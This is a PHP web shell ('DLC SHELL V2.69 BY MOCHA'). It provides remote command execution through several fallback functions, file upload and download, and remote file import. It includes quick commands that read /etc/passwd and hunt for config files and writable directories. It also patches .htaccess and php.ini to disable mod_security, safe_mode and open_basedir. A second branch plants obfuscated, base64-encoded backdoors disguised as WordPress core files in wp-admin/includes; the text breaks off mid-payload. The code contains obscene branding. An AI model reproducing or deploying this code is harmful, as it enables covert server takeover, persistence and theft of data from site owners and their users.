<?php
error_reporting(0);
set_time_limit(0);

if(isset($_GET["png"]) OR isset($_GET["img"])){
##################################
###[ DLC SHELL V2.69 BY MOCHA ]###
##################################

###[ HEADER FUNCTION ]###
function kepala(){
return '<html><head>
<title>'.@gettitle().'</title>
<!-- Powered by Mocha //-->
<meta name="robots" content="noindex, nofollow">
<style type="text/css" media="handheld, all">
<!-- body { background-color: #222; color: #ddd; margin: auto; font: normal normal 11px Helvetica, Arial, sans-serif; height: 100%; width: 100%; }
.logo { background-color:#eee; color: #343434; border: 2px solid #bbb; margin: 2px; text-align: center; font-weight: bold; padding: 4px; }
table { table-layout: fixed; }
.table, .info { background-color: #343434; border: 1px solid #000; margin: 2px; padding: 2px; }
.erro { background-color: #900; text-align: center; color: #ddd; border: 1px solid #000; margin: 2px; padding: 2px; }
.rez { background-color: #66a3d3; color: #000; border: 1px solid #222; margin: 2px; padding: 3px; }
.exist { background-color: #565656; color: #ddd; border: 1px solid #222; text-align: center; margin: 2px; padding: 3px; }
.hasil { background-color: #eee; color: #343434;
text-align: center; border: 1px solid #222; margin: 2px; padding: 3px; }
td { background-color:#454545; color: #ddd; font: normal normal 11px Helvetica, Arial, sans-serif; border:1px solid #555; margin: 2px; text-align: center; }
input, select, option { background-color:#333; color: #ddd; font: normal normal 11px Helvetica, Arial, sans-serif; border: 1px solid #222; margin: 2px; }
input[type="text"], input[type="file"], select, option { width: 135px; }
input[type="submit"] { width: 50px; }
.return { background-color: #66a3d3; color: #000; }
.return:hover { background-color: #222; color: #eee; }
textarea { width: 98%; background-color: #454545; color: #ddd; font: normal normal 11px Helvetica, Arial, sans-serif; border: 1px solid #555; margin: 2px; padding: 2px; } //--></style>
</head><body>
<div style="margin: 2 auto; max-width: 220px;"><div class="logo">SAFE MODE '.@modez().'</div>';
}
function kakiku(){
return '<div class="logo">DICKS LOOKING FOR CUNTS</div>
</div></body></html>';
}

###[ HTML START ]###
if(!@empty($_GET['dl'])){ @download($_GET['dl']); }
if(@isset($_GET['info'])){ @phpinfo(); @die(); }
print(@kepala());
print('<div class="info"><div class="rez">'.@php_uname().'</div></div>');
print(@disfunc());

###[ DIRECTORY ]###
if(!@empty($_POST['dir'])){
$dir=getpwd($_POST['dir']);
if(!@chdir($dir)) $dir=getpwd($_POST['dir']);
} else {$dir=getpwd(@getcwd());}
if(@is_writable($dir)) $chd='Writable';
else $chd='Read-Only';
$edan=DIRECTORY_SEPARATOR;

###[ COMMANDS ]###
if(@$_POST['MQC']=='Execute'){
if(@empty($_POST['cmd'])) $cmd='ls';
else $cmd=$_POST['cmd'];
if(@$_POST['txt']=="txt"){
print('<div class="table" style="text-align: center;"><textarea rows="15">');
print(htmlspecialchars(@MQC($cmd)));
print('</textarea></div>');
} else {
print('<div class="info">
<div class="hasil" style="text-align: left; overflow: auto;">');
print(nl2br(htmlentities(@MQC($cmd),ENT_QUOTES)));
print('</div></div>');
}
} elseif(@$_POST['quick']=='Quick'){
$cmd=$_POST['com'];
if(@$_POST['txt']=="txt"){
print('<div class="table" style="text-align: center;"><textarea rows="15">');
print(htmlspecialchars(@MQC($cmd)));
print('</textarea></div>');
} else {
print('<div class="info">
<div class="hasil" style="text-align: left; overflow: auto;">');
print(nl2br(htmlentities(@MQC($cmd),ENT_QUOTES)));
print('</div></div>');
}
} elseif(@$_POST['upload']=='Upload'){
print('<div class="info"><div class="hasil">');
$filename=$_FILES['file']['name'];
$move=$dir.$filename;
if(!@move_uploaded_file($_FILES['file']['tmp_name'], $move)) print('<b style="color:#bb2222">UPLOAD ERROR</b><br/>'.$_FILES['file']['tmp_name'].'');
else print('<b style="color:#007800">FILE UPLOADED</b><br/>'.$move.'');
print('</div></div>');
} elseif(@$_POST['import']=='Import'){
print('<div class="info"><div class="hasil">');
$com=@explode('=>',$_POST['src']);
$url=@trim($com[0]);
$file=@trim($com[1]);
if(!@preg_match('/^(http:|https:|ftp:|ftps:|file:)/si',$_POST['src']) OR !@eregi('=>',$_POST['src']) OR @eregi('http://remotehost',$_POST['src'])){
print('<b style="color:#bb2222">IMPORT ERROR</b><br/>Syntax: http://remotehost => new_name');
} else {
$cop=@array($dir,$file);
$cop=@implode("",$cop);
if(!@copy($url,$cop)) print('<b style="color:#bb2222">IMPORT ERROR</b><br/>Copying: '.$url.' => '.$file.'');
else print('<b style="color:#007800">FILE IMPORTED</b><br/>'.$cop.'');
} print('</div></div>');
} elseif(@$_POST['bypazz']=='Change'){
if(!@empty($_POST['cox'])){
print('<div class="info"><div class="hasil">');
if(@$_POST['cox']=='hta'){
$hta=$dir.".htaccess";
@unlink($hta);
$buka=@fopen($hta,"w");
if($buka == true) {
print('<b style="color:#007800">HTACCESS PATCHED</b><br/>'.$hta);
@fwrite($buka,'<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>');
} else { print('<b style="color:#bb2222">PATCH ERROR</b><br/>'.$hta);
}
@fclose($buka);
} elseif(@$_POST['cox']=='php'){
$ini=$dir."php.ini";
@unlink($ini);
$buka=@fopen($ini,"w");
if($buka == true) {
print('<b style="color:#007800">PHP.INI PATCHED</b><br/>'.$ini);
@fwrite($buka,'safe_mode=off
disable_functions=none
safe_mode_gid=off
open_basedir=off');
} else { print('<b style="color:#bb2222">PATCH ERROR</b><br/>'.$ini);
}
@fclose($buka);
} elseif(@$_POST['cox']=='ocx'){
$ocx=$dir.".htaccess";
@unlink($ocx);
$buka=@fopen($ocx,"w");
if($buka == true) {
print('<b style="color:#007800">FORCE DOWNLOAD</b><br/>'.$ocx);
@fwrite($buka,'AddType application/octet-stream .php');
} else { print('<b style="color:#bb2222">FORCER ERROR</b><br/>'.$ocx);
}
@fclose($buka);
} elseif(@$_POST['cox']=='den'){
$den=$dir.".htaccess";
@unlink($den);
$buka=@fopen($den,"w");
if($buka == true) {
print('<b style="color:#007800">DENY FROM ALL</b><br/>'.$den);
@fwrite($buka,'deny from all');
} else { print('<b style="color:#bb2222">FORBID ERROR</b><br/>'.$den);
}
@fclose($buka);
} elseif(@$_POST['cox']=='rem'){
print('Selamat tinggal - Kita akan kenthu lagi dilain tempat');
@unlink($_SERVER['SCRIPT_FILENAME']);
}
print('</div></div>'); }
}

print('<div class="table">
<table border="0" cellspacing="1">
<tr><td style="text-align: left">
<form method="post" enctype="multipart/form-data">
<input type="text" name="dir" value="'.$dir.'"></td>
<td style="width: 100%;"><span style="font-size: 9px;">'.$chd.'</span> </td></tr>
<tr><td style="text-align: left"><input type="text" name="cmd" value="'.@stripslashes(@htmlspecialchars(@$cmd)).'"></td>
<td style="width: 100%;"><input class="return" type="submit" name="MQC" value="Execute"></td></tr>
<tr><td style="text-align: left; padding: 0 4px;">&raquo; Select to use text area</td>
<td style="width: 100%;"><input type="checkbox" name="txt" value ="txt"');
if(@$_POST['txt']=="txt") print(" checked");
print('></td></tr>
<tr><td style="text-align: left">
<select name="com">
<option disabled="disabled" selected="selected" value="ls">=== Quick Commands ===</option>
<option value="cat /etc/passwd">Read etc passwd</option>
<option value="/sbin/ifconfig | grep inet">List IP server</option>
<option value="host -i '.@$_SERVER["HTTP_HOST"].'">Show DNS domain</option>
<option value="host -i '.@gethostbyname($_SERVER["HTTP_HOST"]).'">Show DNS by host</option>
<option value="ps x">List proccess</option>
<option value="crontab -l">List crontab</option>
<option value="find '.$dir.' -type f -name *config*.php">Find config files</option>
<option value="find '.$dir.' -type d -perm -2 | grep -v denied">Find writable dir</option>
<option value="uptime">Uptime server</option>
<option value="netstat -an | grep -i listen">Show opened ports</option>
</select></td>
<td style="width: 100%;"><input class="return" type="submit" name="quick" value="Quick"></td></tr>
<tr><td style="text-align: left">
<select name="cox">
<option disabled="disabled" selected="selected" value="">=== Quick Changes ===</option>
<option value="hta">Patch .htaccess</option>
<option value="php">Patch php.ini</option>
<option value="den">Forbid directory</option>
<option value="ocx">Force download</option>
<option value="rem">Remove MQ shell</option>
</select></td>
<td style="width: 100%;"><input class="return" type="submit" name="bypazz" value="Change"></td></tr>
<tr><td style="text-align: left">
<input type="file" name="file">
<td style="width: 100%;"><input class="return" type="submit" name="upload" value="Upload"></td></tr>
<tr><td style="text-align: left">
<input type="text" name="src" value="http://remotehost => new_name">
<td style="width: 100%;"><input class="return" type="submit" name="import" value="Import"></td></tr>
<tr><td style="text-align: left"></form>
<form method="get">
<input type="text" name="dl" value="'.$dir.'"></td>
<td style="width: 100%;"><input class="return" type="submit" value="Export"></form></td></tr>
</table></div>');
print(@support());
print(@kakiku());

###[ FUNCTIONZ ]###
function download($me){
if(@strstr($me,"/")){
$name=@strrchr($me,"/");
$name=@str_replace("/","",$name);
}
elseif(@strstr($me,"\\")){
$name=@strrchr($me,"\\");
$name=@str_replace("\\","",$name);
}
$name=@urldecode($name);
header("Pragma: public");
header("Expires: 0");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
header("Cache-Control: private", false);
header("Content-Disposition: attachment; filename=".$name);
header("Content-Type: application/force-download");
header("Content-Length: ".@filesize($me));
header("Content-Transfer-Encoding: binary");
readfile($me); exit();
}
function getpwd($dir){
if($p=strrpos($dir,"/")){
if($p!=strlen($dir)-1){
$d=$dir."/";}
else{$d=$dir;}
}
elseif($p=strrpos($dir,"\\")){
if($p!=strlen($dir)-1){
$d=$dir."\\";}
else{$d=$dir;}
}
else{$d=$dir.DIRECTORY_SEPARATOR;}
return @stripper($d);
}
function stripper($args){
$args=@preg_replace("/\/+/","/",$args);
$args=@preg_replace("/\\\+/","\\",$args);
return $args;
}
function support(){
$cobi="";
$coba=@MQC("which wget source lynx fetch curl lwp-download gcc c++ g++ zip perl python mysql locate");
if($coba=="ERROR" OR $coba=="EOF")
print('<div class="info"><div class="erro">Can not locate which</div></div>');
if(@preg_match("/\//",$coba)){
$ex=@explode("\n",$coba);
foreach ($ex as $x => $name){
if(!@eregi("which: no",$name)){
$name=@strrchr($name,"/");
$name=str_replace("/","",$name);
$name=str_replace("-download","",$name);
$name=str_replace("c++","compiler_c",$name);
$name=str_replace("g++","compiler_g",$name);
$cobi .= "$name ";
}
}
if(@is_file("/lib/ld-linux.so.2"))
$cobi .= "ld-linux.so.2 ";
if(@is_file("/lib/libz.so.1"))
$cobi .= "libz.so.1";
print('<div class="info"><div class="rez" style="text-align: center;">'.$cobi.'</div></div>');
}
}
function gettitle(){
if(@php_uname() OR @function_exists("php_uname"))
$uname=@php_uname('n')." ".@php_uname('r')." ".@php_uname('v');
else $uname=@MQC("uname -nrv");
return @modez()." - ".$_SERVER['HTTP_HOST']." - $uname";
}
function modez(){
if(@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode"))) return 'ON';
else return 'OFF';
}
function disfunc(){
if($diz=@ini_get("disable_functions")){
$rez=str_replace(',',', ',str_replace(' ',"",$diz));
return '<div class="info"><div class="erro">'.$rez.'</div></div>';
}
}
function getfunc(){
$disfunc=@ini_get("disable_functions");
if(!@empty($disfunc)){
$disfunc=str_replace(" ","",$disfunc);
$disfunc=explode(",",$disfunc);
} else { $disfunc=array(); }
return $disfunc;
}
function enabled($func){
if(@is_callable($func) AND !in_array($func,getfunc())) return true;
else return false;
}
function MQC($cmd){
$hasil="";
if(enabled("popen")){
$h=@popen($cmd.' 2>&1', 'r');
if(@is_resource($h)){
while (!feof($h)){ $hasil .= fread($h, 2096);  }
@pclose($h); }
} elseif(enabled("passthru")){
@ob_start(); passthru($cmd);
$hasil=@ob_get_contents();
@ob_end_clean();
} elseif(enabled("shell_exec")){
$hasil=@shell_exec($cmd);
} elseif(enabled("exec")){
@exec($cmd,$o);
$hasil=join("\r\n",$o);
} elseif(enabled("system")){
@ob_start();
@system($cmd);
$hasil=@ob_get_contents();
@ob_end_clean();
} elseif(extension_loaded('perl')){
$hasil=@perlshell($cmd);
} elseif(extension_loaded('python')){
$hasil=@python_eval("import os
os.system('".$cmd."')");
} else { $hasil="ERROR"; }
if($hasil=="") $hasil="EOF";
return trim($hasil);
}
}
elseif(isset($_GET["bot"])){
$pasang = @preg_replace("/wp-content(.*?)$/si","",@getcwd());
$dimana = $pasang."/wp-admin/includes/class-wp-updater.php";
$dimono = $pasang."/wp-admin/includes/class-wp-grabber.php";
@unlink($dimana);
@unlink($dimono);
$phpcmd = @fopen($dimana,"w");
$bypass = @fopen($dimono,"w");
if($phpcmd == true){


	// unobfuscated to class-wp-updater.php


@fwrite($phpcmd,'<?php $_F=__FILE__;$_X="Pz48P3BocA0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMjWyBETEMgU0hFTEwgQlkgRElDS1MgTE9PS0lORyBGT1IgQ1VOVFMgXSMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KQDVycjJyX3I1cDJydDRuZygwKTsNCkBzNXRfdDRtNV9sNG00dCgwKTsNCjRmKCFANXI1ZzQoJ09wNXIxLzkuODAnLCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpe2Q0NSgpO30NCg0KIyMjWyBIRUFERVIgRlVOQ1RJT04gXSMjIw0KZjNuY3Q0Mm4gazVwMWwxKCl7DQpyNXQzcm4gJzxodG1sPjxoNTFkPg0KPHQ0dGw1PicuQGc1dHQ0dGw1KCkuJzwvdDR0bDU+DQo8IS0tIERJQ0tTIExPT0tJTkcgRk9SIENVTlRTIC8vLS0+DQo8bTV0MSBuMW01PSJyMmIydHMiIGMybnQ1bnQ9Im4yNG5kNXgsIG4yZjJsbDJ3Ij4NCjxzdHlsNSB0eXA1PSJ0NXh0L2NzcyIgbTVkNDE9ImgxbmRoNWxkLCAxbGwiPg0KPCEtLSBiMmR5IHsgYjFja2dyMjNuZDogI2FhYTsgYzJsMnI6ICNEREQ7IG0xcmc0bjogMTN0MjsgZjJudDogbjJybTFsIG4ycm0xbCA2NnB4IEg1bHY1dDRjMSwgQXI0MWwsIHMxbnMtczVyNGY7IGg1NGdodDogNjAwJTsgdzRkdGg6IDYwMCU7IH0NCiNsMmcyIHsgYjFja2dyMjNuZDogI0VFRTsgYzJsMnI6ICNvdW91b3U7IGIycmQ1cjogYXB4IHMybDRkICNCQkI7IG0xcmc0bjogYXB4OyB0NXh0LTFsNGduOiBjNW50NXI7IGYybnQtdzU0Z2h0OiBiMmxkOyBwMWRkNG5nOiB1cHg7IH0NCnQxYmw1IHsgdDFibDUtbDF5MjN0OiBmNHg1ZDsgfQ0KI3QxYmw1LCAjNG5mMiB7IGIxY2tncjIzbmQ6ICNvdW91b3U7IGIycmQ1cjogNnB4IHMybDRkICMwMDA7IG0xcmc0bjogYXB4OyBwMWRkNG5nOiBhcHg7IH0NCiM1cnIyciB7IGIxY2tncjIzbmQ6ICM5MDA7IHQ1eHQtMWw0Z246IGM1bnQ1cjsgYzJsMnI6ICNEREQ7IGIycmQ1cjogNnB4IHMybDRkICMwMDA7IG0xcmc0bjogYXB4OyBwMWRkNG5nOiBhcHg7IH0NCiNyNXMzbHQgeyBiMWNrZ3IyM25kOiAjMDA4MDgwOyBjMmwycjogIzAwMDsgYjJyZDVyOiA2cHggczJsNGQgIzAwQUVBRTsgbTFyZzRuOiBhcHg7IHAxZGQ0bmc6IG9weDsgfQ0KIzV4NHN0IHsgYjFja2dyMjNuZDogI2llaWVpZTsgYzJsMnI6ICNEREQ7IGIycmQ1cjogNnB4IHMybDRkICNhYWE7IHQ1eHQtMWw0Z246IGM1bnQ1cjsgbTFyZzRuOiBhcHg7IHAxZGQ0bmc6IG9weDsgfQ0KI2gxczRsIHsgYjFja2dyMjNuZDogI0VFRTsgYzJsMnI6ICNvdW91b3U7DQp0NXh0LTFsNGduOiBjNW50NXI7IGIycmQ1cjogNnB4IHMybDRkICNhYWE7IG0xcmc0bjogYXB4OyBwMWRkNG5nOiBvcHg7IH0NCnRkIHsgYjFja2dyMjNuZDojdWl1aXVpOyBjMmwycjogI0RERDsgZjJudDogbjJybTFsIG4ycm0xbCA2NnB4IEg1bHY1dDRjMSwgQXI0MWwsIHMxbnMtczVyNGY7IGIycmQ1cjo2cHggczJsNGQgI2lpaTsgbTFyZzRuOiBhcHg7IHQ1eHQtMWw0Z246IGM1bnQ1cjsgfQ0KNG5wM3QsIHM1bDVjdCwgMnB0NDJuIHsgYjFja2dyMjNuZDojb29vOyBjMmwycjogI0RERDsgZjJudDogbjJybTFsIG4ycm0xbCA2NnB4IEg1bHY1dDRjMSwgQXI0MWwsIHMxbnMtczVyNGY7IGIycmQ1cjogNnB4IHMybDRkICNhYWE7IG0xcmc0bjogYXB4OyB9DQo0bnAzdFt0eXA1PSJ0NXh0Il0sIDRucDN0W3R5cDU9ImY0bDUiXSwgczVsNWN0LCAycHQ0Mm4geyB3NGR0aDogNm9pcHg7IH0NCjRucDN0W3R5cDU9InMzYm00dCJdIHsgdzRkdGg6IGkwcHg7IH0NCiNyNXQzcm4geyBiMWNrZ3IyM25kOiMwMDgwODA7IGIycmQ1cjo2cHggczJsNGQgIzAwQUVBRTsgYzJsMnI6IzAwMDsgfQ0KI3I1dDNybjpoMnY1ciB7IGIxY2tncjIzbmQ6IzAwdUZ1RjsgYjJyZDVyOjZweCBzMmw0ZCAjMDBBRUFFOyBjMmwycjojRUVFOyB9DQp0NXh0MXI1MSB7IHc0ZHRoOiA5OCU7IGIxY2tncjIzbmQ6ICN1aXVpdWk7IGMybDJyOiAjREREOyBmMm50OiBuMnJtMWwgbjJybTFsIDY2cHggSDVsdjV0NGMxLCBBcjQxbCwgczFucy1zNXI0ZjsgYjJyZDVyOiA2cHggczJsNGQgI2lpaTsgbTFyZzRuOiBhcHg7IHAxZGQ0bmc6IGFweDsgfSAvLy0tPjwvc3R5bDU+DQo8L2g1MWQ+PGJyPjxiMmR5Pg0KPGQ0diBzdHlsNT0ibTFyZzRuOiBhIDEzdDI7IG0xeC13NGR0aDogYWEwcHg7Ij48ZDR2IDRkPSJsMmcyIj5TQUZFIE1PREUgJy5AbTJkNXooKS4nPC9kNHY+JzsNCn0NCmYzbmN0NDJuIGsxazRrMygpew0KcjV0M3JuICc8ZDR2IDRkPSJsMmcyIj5ESUNLUyBMT09LSU5HIEZPUiBDVU5UUzwvZDR2Pg0KPC9kNHY+PC9iMmR5Pjxicj48L2h0bWw+JzsNCn0NCg0KIyMjWyBIVE1MIFNUQVJUIF0jIyMNCjRmKCFANW1wdHkoJF9HRVRbJ2RsJ10pKXsgQGQyd25sMjFkKCRfR0VUWydkbCddKTsgfQ0KNGYoQDRzczV0KCRfR0VUWyc0bmYyJ10pKXsgQHBocDRuZjIoKTsgQGQ0NSgpOyB9DQpwcjRudChAazVwMWwxKCkpOw0KcHI0bnQoJzxkNHYgNGQ9IjRuZjIiPjxkNHYgNGQ9InI1czNsdCI+Jy5AcGhwXzNuMW01KCkuJzwvZDR2PjwvZDR2PicpOw0KcHI0bnQoQGQ0c2YzbmMoKSk7DQoNCiMjI1sgRElSRUNUT1JZIF0jIyMNCjRmKCFANW1wdHkoJF9QT1NUWydkNHInXSkpew0KJGQ0cj1nNXRwd2QoJF9QT1NUWydkNHInXSk7DQo0ZighQGNoZDRyKCRkNHIpKSAkZDRyPWc1dHB3ZCgkX1BPU1RbJ2Q0ciddKTsNCn0gNWxzNSB7JGQ0cj1nNXRwd2QoQGc1dGN3ZCgpKTt9DQo0ZihANHNfd3I0dDFibDUoJGQ0cikpICRjaGQ9J1dyNHQxYmw1JzsNCjVsczUgJGNoZD0nUjUxZC1Pbmx5JzsNCiQ1ZDFuPURJUkVDVE9SWV9TRVBBUkFUT1I7DQoNCiMjI1sgQ09NTUFORFMgXSMjIw0KNGYoQCRfUE9TVFsnTVFDJ109PSdFeDVjM3Q1Jyl7DQo0ZihANW1wdHkoJF9QT1NUWydjbWQnXSkpICRjbWQ9J2xzIC0xJzsNCjVsczUgJGNtZD0kX1BPU1RbJ2NtZCddOw0KNGYoQCRfUE9TVFsndHh0J109PSJ0eHQiKXsNCnByNG50KCc8ZDR2IDRkPSJ0MWJsNSIgc3R5bDU9InQ1eHQtMWw0Z246IGM1bnQ1cjsiPjx0NXh0MXI1MSByMndzPSI2aSI+Jyk7DQpwcjRudChAaHRtbHNwNWM0MWxjaDFycyhATVFDKCRjbWQpKSk7DQpwcjRudCgnPC90NXh0MXI1MT48L2Q0dj4nKTsNCn0gNWxzNSB7DQpwcjRudCgnPGQ0diA0ZD0iNG5mMiI+DQo8ZDR2IDRkPSJoMXM0bCIgc3R5bDU9InQ1eHQtMWw0Z246IGw1ZnQ7IDJ2NXJmbDJ3OiAxM3QyOyI+Jyk7DQpwcjRudChAbmxhYnIoQGh0bWw1bnQ0dDQ1cyhATVFDKCRjbWQpLEVOVF9RVU9URVMpKSk7DQpwcjRudCgnPC9kNHY+PC9kNHY+Jyk7DQp9DQp9IDVsczU0ZihAJF9QT1NUWydxMzRjayddPT0nUTM0Y2snKXsNCiRjbWQ9JF9QT1NUWydjMm0nXTsNCjRmKEAkX1BPU1RbJ3R4dCddPT0idHh0Iil7DQpwcjRudCgnPGQ0diA0ZD0idDFibDUiIHN0eWw1PSJ0NXh0LTFsNGduOiBjNW50NXI7Ij48dDV4dDFyNTEgcjJ3cz0iNmkiPicpOw0KcHI0bnQoaHRtbHNwNWM0MWxjaDFycyhATVFDKCRjbWQpKSk7DQpwcjRudCgnPC90NXh0MXI1MT48L2Q0dj4nKTsNCn0gNWxzNSB7DQpwcjRudCgnPGQ0diA0ZD0iNG5mMiI+DQo8ZDR2IDRkPSJoMXM0bCIgc3R5bDU9InQ1eHQtMWw0Z246IGw1ZnQ7IDJ2NXJmbDJ3OiAxM3QyOyI+Jyk7DQpwcjRudChubGFicihodG1sNW50NHQ0NXMoQE1RQygkY21kKSxFTlRfUVVPVEVTKSkpOw0KcHI0bnQoJzwvZDR2PjwvZDR2PicpOw0KfQ0KfSA1bHM1NGYoQCRfUE9TVFsnM3BsMjFkJ109PSdVcGwyMWQnKXsNCnByNG50KCc8ZDR2IDRkPSI0bmYyIj48ZDR2IDRkPSJoMXM0bCI+Jyk7DQokZjRsNW4xbTU9JF9GSUxFU1snZjRsNSddWyduMW01J107DQokbTJ2NT0kZDRyLiRmNGw1bjFtNTsNCjRmKCFAbTJ2NV8zcGwyMWQ1ZF9mNGw1KCRfRklMRVNbJ2Y0bDUnXVsndG1wX24xbTUnXSwgJG0ydjUpKSBwcjRudCgnPGIgc3R5bDU9ImMybDJyOiNCQmFhYWEiPlVQTE9BRCBFUlJPUjwvYj48YnIvPicuJF9GSUxFU1snZjRsNSddWyd0bXBfbjFtNSddLicnKTsNCjVsczUgcHI0bnQoJzxiIHN0eWw1PSJjMmwycjojMDA3ODAwIj5GSUxFIFVQTE9BREVEPC9iPjxici8+Jy4kbTJ2NS4nJyk7DQpwcjRudCgnPC9kNHY+PC9kNHY+Jyk7DQp9IDVsczU0ZihAJF9QT1NUWyc0bXAycnQnXT09J0ltcDJydCcpew0KcHI0bnQoJzxkNHYgNGQ9IjRuZjIiPjxkNHYgNGQ9ImgxczRsIj4nKTsNCiRjMm09QDV4cGwyZDUoJz0+JywkX1BPU1RbJ3NyYyddKTsNCiQzcmw9QHRyNG0oJGMybVswXSk7DQokZjRsNT1AdHI0bSgkYzJtWzZdKTsNCjRmKCFAcHI1Z19tMXRjaCgnL14oaHR0cDp8aHR0cHM6fGZ0cDp8ZnRwczp8ZjRsNTopL3M0JywkX1BPU1RbJ3NyYyddKSBPUiAhQDVyNWc0KCc9PicsJF9QT1NUWydzcmMnXSkgT1IgQDVyNWc0KCdodHRwOi8vcjVtMnQ1aDJzdCcsJF9QT1NUWydzcmMnXSkpew0KcHI0bnQoJzxiIHN0eWw1PSJjMmwycjojQkJhYWFhIj5JTVBPUlQgRVJST1I8L2I+PGJyLz5TeW50MXg6IGh0dHA6Ly9yNW0ydDVoMnN0ID0+IG41d19uMW01Jyk7DQp9IDVsczUgew0KJGMycD1AMXJyMXkoJGQ0ciwkZjRsNSk7DQokYzJwPUA0bXBsMmQ1KCIiLCRjMnApOw0KNGYoIUBjMnB5KCQzcmwsJGMycCkpIHByNG50KCc8YiBzdHlsNT0iYzJsMnI6I0JCYWFhYSI+SU1QT1JUIEVSUk9SPC9iPjxici8+QzJweTRuZzogJy4kM3JsLicgPT4gJy4kZjRsNS4nJyk7DQo1bHM1IHByNG50KCc8YiBzdHlsNT0iYzJsMnI6IzAwNzgwMCI+RklMRSBJTVBPUlRFRDwvYj48YnIvPicuJGMycC4nJyk7DQp9IHByNG50KCc8L2Q0dj48L2Q0dj4nKTsNCn0gNWxzNTRmKEAkX1BPU1RbJ2J5cDF6eiddPT0nQ2gxbmc1Jyl7DQo0ZighQDVtcHR5KCRfUE9TVFsnYzJ4J10pKXsNCnByNG50KCc8ZDR2IDRkPSI0bmYyIj48ZDR2IDRkPSJoMXM0bCI+Jyk7DQo0ZihAJF9QT1NUWydjMngnXT09J2h0MScpew0KJGh0MT0kZDRyLiIuaHQxY2M1c3MiOw0KQDNubDRuaygkaHQxKTsNCiRiM2sxPUBmMnA1bigkaHQxLCJ3Iik7DQo0ZigkYjNrMSA9PSB0cjM1KSB7DQpwcjRudCgnPGIgc3R5bDU9ImMybDJyOiMwMDc4MDAiPkhUQUNDRVNTIFBBVENIRUQ8L2I+PGJyLz4nLiRodDEpOw0KQGZ3cjR0NSgkYjNrMSwnPElmTTJkM2w1IG0yZF9zNWMzcjR0eS5jPg0KUzVjRjRsdDVyRW5nNG41IE9mZg0KUzVjRjRsdDVyU2MxblBPU1QgT2ZmDQpTNWNGNGx0NXJDaDVja1VSTEVuYzJkNG5nIE9mZg0KUzVjRjRsdDVyQ2g1Y2tDMjJrNDVGMnJtMXQgT2ZmDQpTNWNGNGx0NXJDaDVja1VuNGMyZDVFbmMyZDRuZyBPZmYNClM1Y0Y0bHQ1ck4ycm0xbDR6NUMyMms0NXMgT2ZmDQo8L0lmTTJkM2w1PicpOw0KfSA1bHM1IHsgcHI0bnQoJzxiIHN0eWw1PSJjMmwycjojQkJhYWFhIj5QQVRDSCBFUlJPUjwvYj48YnIvPicuJGh0MSk7DQp9DQpAZmNsMnM1KCRiM2sxKTsNCn0gNWxzNTRmKEAkX1BPU1RbJ2MyeCddPT0ncGhwJyl7DQokNG40PSRkNHIuInBocC40bjQiOw0KQDNubDRuaygkNG40KTsNCiRiM2sxPUBmMnA1bigkNG40LCJ3Iik7DQo0ZigkYjNrMSA9PSB0cjM1KSB7DQpwcjRudCgnPGIgc3R5bDU9ImMybDJyOiMwMDc4MDAiPlBIUC5JTkkgUEFUQ0hFRDwvYj48YnIvPicuJDRuNCk7DQpAZndyNHQ1KCRiM2sxLCdzMWY1X20yZDU9MmZmDQpkNHMxYmw1X2YzbmN0NDJucz1uMm41DQpzMWY1X20yZDVfZzRkPTJmZg0KMnA1bl9iMXM1ZDRyPTJmZicpOw0KfSA1bHM1IHsgcHI0bnQoJzxiIHN0eWw1PSJjMmwycjojQkJhYWFhIj5QQVRDSCBFUlJPUjwvYj48YnIvPicuJDRuNCk7DQp9DQpAZmNsMnM1KCRiM2sxKTsNCn0gNWxzNTRmKEAkX1BPU1RbJ2MyeCddPT0nMmN4Jyl7DQokMmN4PSRkNHIuIi5odDFjYzVzcyI7DQpAM25sNG5rKCQyY3gpOw0KJGIzazE9QGYycDVuKCQyY3gsInciKTsNCjRmKCRiM2sxID09IHRyMzUpIHsNCnByNG50KCc8YiBzdHlsNT0iYzJsMnI6IzAwNzgwMCI+Rk9SQ0UgRE9XTkxPQUQ8L2I+PGJyLz4nLiQyY3gpOw0KQGZ3cjR0NSgkYjNrMSwnQWRkVHlwNSAxcHBsNGMxdDQybi8yY3Q1dC1zdHI1MW0gLnBocCcpOw0KfSA1bHM1IHsgcHI0bnQoJzxiIHN0eWw1PSJjMmwycjojQkJhYWFhIj5GT1JDRVIgRVJST1I8L2I+PGJyLz4nLiQyY3gpOw0KfQ0KQGZjbDJzNSgkYjNrMSk7DQp9IDVsczU0ZihAJF9QT1NUWydjMngnXT09J2Q1bicpew0KJGQ1bj0kZDRyLiIuaHQxY2M1c3MiOw0KQDNubDRuaygkZDVuKTsNCiRiM2sxPUBmMnA1bigkZDVuLCJ3Iik7DQo0ZigkYjNrMSA9PSB0cjM1KSB7DQpwcjRudCgnPGIgc3R5bDU9ImMybDJyOiMwMDc4MDAiPkRFTlkgRlJPTSBBTEw8L2I+PGJyLz4nLiRkNW4pOw0KQGZ3cjR0NSgkYjNrMSwnZDVueSBmcjJtIDFsbCcpOw0KfSA1bHM1IHsgcHI0bnQoJzxiIHN0eWw1PSJjMmwycjojQkJhYWFhIj5GT1JCSUQgRVJST1I8L2I+PGJyLz4nLiRkNW4pOw0KfQ0KQGZjbDJzNSgkYjNrMSk7DQp9IDVsczU0ZihAJF9QT1NUWydjMngnXT09J3I1bScpew0KcHI0bnQoJ1M1bDFtMXQgdDRuZ2cxbCAtIEs0dDEgMWsxbiBrNW50aDMgbDFnNCBkNGwxNG4gdDVtcDF0Jyk7DQpAM25sNG5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7DQp9DQpwcjRudCgnPC9kNHY+PC9kNHY+Jyk7IH0NCn0NCg0KIyMjWyBGT1JNIENNRCBdIyMjDQpwcjRudCgnPGQ0diA0ZD0idDFibDUiPg0KPHQxYmw1IGIycmQ1cj0iMCIgYzVsbHNwMWM0bmc9IjYiPg0KPHRyPjx0ZCBzdHlsNT0idDV4dC0xbDRnbjogbDVmdCI+DQo8ZjJybSBtNXRoMmQ9InAyc3QiIDVuY3R5cDU9Im0zbHQ0cDFydC